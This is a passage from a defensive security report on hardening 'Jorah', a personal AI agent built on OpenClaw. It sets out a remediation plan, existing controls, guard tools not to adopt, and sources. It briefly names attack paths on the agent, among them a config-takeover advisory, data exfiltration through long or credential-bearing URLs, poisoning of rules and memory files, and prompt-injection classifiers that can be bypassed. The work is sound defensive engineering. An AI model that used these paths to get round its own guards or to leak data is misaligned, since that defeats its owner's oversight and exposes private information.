| 2 | **Deal with GHSA-pw3x-g8v8-fvj2.** (a) Confirm on the live Gateway that a call to the `openclaw` tool is blocked (decision log). (b) Name it in the matrix's `blocked` list and, if the schema accepts it, in global `tools.deny`. (c) Move to 2026.10.33 through the canary profile. It is one day old, so the 7-day rule needs the written security exception | Small, plus the upgrade test set | A config-takeover path whose only current barrier is the guard | Upgrade regressions. `tools.deny: ["openclaw"]` is untested |
| 3 | **Remove today's friction without loosening the rule.** A typed release-info step (owner, repo, tag) for the toolbox, and an approval card in place of a hard block for well-shaped unseen URLs | Small to medium | The habit of pasting links, and the pull to widen the allowlist | Card fatigue; a few characters of leak to GitHub through path parts |
| 4 | **Watch the right advisory feed.** A daily read of the repo's advisory list compared with the pinned version, reported by the watchdog. `npm audit` lags, as today shows | Small | Learning about a relevant advisory late | One more unauthenticated GitHub API call a day |
| 5 | **Turn on `security.installPolicy`** with a tiny local script that blocks everything not on a list | Small | A skill or plugin install by mistake or by a hijacked run | None of note. ClawScan is not needed for a block-by-default script |
| 6 | **Build `reader-web`** before mail connects, as planned | Medium to large | The trifecta itself for web reading | A second agent to keep; its typed output still needs care |
| 7 | **Add Anthropic's URL hygiene** to the guard: refuse URLs over 250 characters and credential-looking URLs in tainted chats | Small | Bulk exfiltration in one request | Rare false refusals on long legitimate URLs |
| 8 | **Stronger download proof where offered:** record `immutable`; run `gh release verify-asset` or `gh attestation verify` (gh 2.102.0 or newer) and show "digest only", "immutable" or "attested" on the card | Small to medium | Asset swapped after publication; build not from the repo | A `gh` binary under the toolbox user. Whether attestation checks work without a token is [unverified] |
| 9 | **Destination log for the Gateway** through `proxy.proxyUrl` and a plain forward proxy that only logs hosts, with a daily "new hosts" line | Medium | Exfiltration going unnoticed | A new process in the path; Telegram and child processes need their own wiring per the docs. Canary first |
| 10 | **Hash baseline for rules files** (AGENTS.md, SOUL.md, skills) with a nightly diff to Adam | Small | Lasting poisoning through a path the guard cannot see (Dreaming, Claude Code jobs) | None |

### What Jorah already does as well as or better than others

- A provenance rule for URLs, matching Anthropic's hosted tool, where stock OpenClaw has only SSRF blocking and an open feature request.
- Taint set in code before the content arrives, stored on disk, inherited by children; cards with the exact text for memory, rules, skills, schedules and jobs.
- Unknown tools blocked by default, a freeze switch cleared only at a terminal, a hash-chained decision log with no argument values.
- Linux users with separate nftables egress rules, a host-allowlisted proxy for signed-in site browsers, secrets in root-owned files. Public guides stop at UFW, Tailscale and Docker.
- No ClawHub skills, `plugins.allow`, page JavaScript off, link previews off, Telegram allowlisted by numeric id.
- Download verification against GitHub's own record with a release-age rule.

### What not to adopt, and why

- **Any prompt-injection classifier or judge-model plugin as a gate** (MoltGuard/OpenGuardrails, Capsule ClawGuard, Prompt Guard). Bypassable by design, some send content or metrics to third parties, and each is in-process code from a stranger.
- **"Security skills" and rule packs inside the agent** (ClawSec suite, SecureClaw's skill, the SlowMist guide fed to Jorah). Prompt text is not a control, and a skill has the agent's privileges. Read them as checklists.
- **A second generic policy plugin** (Rampart, ClawBands, Knostic Shield). Same hook as `jorah-guard`, less specific, another dependency to trust.
- **Pipelock or ControlClaw in front of the main agent.** Strict mode forbids the open web Jorah needs; the usable mode catches key-shaped strings, not private prose; inspection needs a CA that can read all traffic. ControlClaw is three weeks old.
- **Moving to NemoClaw/OpenShell now.** Good engineering, but a re-platform onto WSL support its own README calls experimental, and the Lasso result shows it does not fix exfiltration through allowed hosts or poisoned identity files.
- **Running `snyk agent-scan` or similar on the PC.** It starts MCP servers and talks to a vendor service. If a scanner is ever wanted, run ClawScan on a staged copy in the Lab.

---

## 7. Could not verify

- OpenAI's link-safety mechanism at the primary page (403); taken from search excerpts and secondary write-ups.
- Snyk ToxicSkills figures, Koi's ClawHavoc counts, exposed-instance counts, the ClawJacked fix version, Microsoft's exact recommendations: secondary only.
- Whether real OpenClaw tool results echo their inputs (the second and third laundering paths), and the exact shape of a real `read` result.
- Whether main is offered the `openclaw` tool on the claude-cli runtime, whether the hook fires for it live, and whether `tools.deny` accepts that name.
- Jorah's live config. Everything about "what Jorah uses" is from the repo.
- Trustworthiness of the third-party projects beyond README and repo metadata.
- Lakera's and Prompt Guard's current details; the pattern names in the design-patterns paper (from memory).
- The harnesses tested in the hook-update paper; MemGhost and CIK numbers beyond their abstracts.
- What a GitHub repo owner can see about requests to paths that do not exist.
- Whether `gh attestation verify` works without a token.
- jgamblin's count of 543 CVE records (his tracker's figure).

---

## 8. Sources

All read 2026-11-19 unless noted.

**OpenClaw, primary**

- Bundled docs 2026.10.9 on the PC: `gateway/security/{index,prompt-injection,tool-permissions,hardened-baseline,browser-control,audit-checks,trust-model}.md`, `security/{network-proxy,formal-verification,THREAT-MODEL-ATLAS}.md`, `security/THREAT-MODEL-ATLAS/collection-and-exfiltration.md`, `tools/{web-fetch,skills,skills-config}.md`, `cli/{security,policy,proxy,openclaw}.md`, `gateway/permission-modes.md`, `gateway/secrets/secret-store-and-egress.md`, `concepts/memory-architecture.md`, `plugins/{community,plugin-permission-requests}.md`, `plugins/hooks/tool-policy.md`, `start/why-openclaw.md`
- Advisories: https://api.github.com/repos/openclaw/openclaw/security-advisories and https://github.com/openclaw/openclaw/security/advisories/GHSA-pw3x-g8v8-fvj2
- Global advisory database: https://api.github.com/advisories?ecosystem=npm&affects=openclaw@2026.10.9
- Releases: https://api.github.com/repos/openclaw/openclaw/releases and https://registry.npmjs.org/openclaw
- Issue: https://github.com/openclaw/openclaw/issues/39685
- ClawScan: https://github.com/openclaw/clawscan and the paper https://arxiv.org/abs/2606.01494

**Projects** (README at `raw.githubusercontent.com/<repo>/HEAD/README.md`, metadata from the GitHub API)

- https://github.com/prompt-security/clawsec, https://github.com/slowmist/openclaw-security-practice-guide, https://github.com/adversa-ai/secureclaw, https://github.com/knostic/openclaw-shield, https://github.com/peg/rampart, https://github.com/pipelab-org/pipelock, https://github.com/NVIDIA/NemoClaw, https://github.com/NVIDIA/OpenShell, https://github.com/cisco-ai-defense/defenseclaw, https://github.com/cisco-ai-defense/skill-scanner, https://github.com/snyk/agent-scan, https://github.com/backbay-labs/clawdstrike, https://github.com/tophant-ai/ClawVault, https://github.com/gl0di/clawseccheck, https://github.com/openafw/moltguard, https://github.com/openguardrails/openguardrails, https://github.com/capsulesecurity/clawguard, https://github.com/SeyZ/clawbands, https://github.com/Gk0Wk/ClawGuard, https://github.com/AquaOne/ClawGuard, https://github.com/madarco/controlclaw, https://github.com/jgamblin/OpenClawCVEs, https://github.com/openclaw/openclaw-ansible, https://github.com/backslash-security/Claw-Hunter, https://github.com/knostic/openclaw-detect
- General tools: https://github.com/meta-llama/PurpleLlama, https://github.com/protectai/llm-guard, https://github.com/NVIDIA-NeMo/Guardrails, https://github.com/google-research/camel-prompt-injection, https://github.com/anthropics/sandbox-runtime, https://github.com/invariantlabs-ai/invariant, https://github.com/nanocoai/nanoclaw, https://github.com/nearai/ironclaw

**URL handling and downloads**

- https://platform.claude.com/docs/en/agents-and-tools/tool-use/web-fetch-tool
- https://openai.com/index/ai-agent-link-safety/ (403; excerpts only) and https://www.gend.co/blog/openai-ai-agent-link-safety
- https://github.blog/changelog/2025-06-03-releases-now-expose-digests-for-release-assets/
- https://github.blog/changelog/2025-10-28-immutable-releases-are-now-generally-available/
- https://docs.github.com/en/code-security/how-tos/secure-your-supply-chain/secure-your-dependencies/verifying-the-integrity-of-a-release
- https://docs.github.com/en/rest/releases/releases
- https://github.com/cli/cli/security/advisories/GHSA-wjmr-j3rp-mh2g

**Research papers**

- https://arxiv.org/abs/2607.05189 (stealth memory injection, MemGhost)
- https://arxiv.org/abs/2604.04759 (real-world safety analysis of OpenClaw)
- https://arxiv.org/abs/2609.03884 (attacker-controlled hook updates)
- https://arxiv.org/abs/2610.35451 (study of OpenClaw security discussions)
- https://arxiv.org/abs/2505.03574 (LlamaFirewall)
- https://arxiv.org/abs/2506.08837 (design patterns)
- Cited from Jorah's earlier research, not re-opened: https://arxiv.org/abs/2510.09023, https://arxiv.org/abs/2503.18813, https://unit42.paloaltonetworks.com/openclaw-ai-supply-chain-risk/

**Incidents and write-ups**

- https://www.cyera.com/blog/claw-chain-cyera-research-unveil-four-chainable-vulnerabilities-in-openclaw
- https://www.imperva.com/blog/compromise-openclaw-with-prompt-injections-in-message-objects/
- https://bdtechtalks.substack.com/p/how-prompt-injection-broke-nvidias
- Secondary: https://thehackernews.com/2026/02/clawjacked-flaw-lets-malicious-sites.html, https://research.jfrog.com/post/ghostclaw-unmasked/, https://blog.polyswarm.io/the-clawhavoc-campaign, https://www.antiy.net/p/clawhavoc-analysis-of-large-scale-poisoning-campaign-targeting-the-openclaw-skill-market-for-ai-agents/, https://www.esecurityplanet.com/threats/openclaw-or-open-door-prompt-injection-creates-ai-backdoors/, https://www.pointguardai.com/ai-security-incidents/openclaw-log-poisoning-enables-indirect-prompt-injection-risk, https://microsoft.com/en-us/security/blog/2026/02/19/running-openclaw-safely-identity-isolation-runtime-risk

**Jorah's repo, read only**

- `docs/plan/03-security-and-privacy.md`, `docs/plan/p5-plan.md`, `docs/plan/research/security.md`, `docs/adr/0004-toolbox-installs-and-licences.md`, `plugins/jorah-guard/{index.js,lib/policy.js,lib/urls.js,test/guard.test.js}`, `config/permission-matrix.json`, `config/pc/*.patch.json5`, `deploy/jorah-firewall.nft`, `deploy/jorah-site-proxy.service`
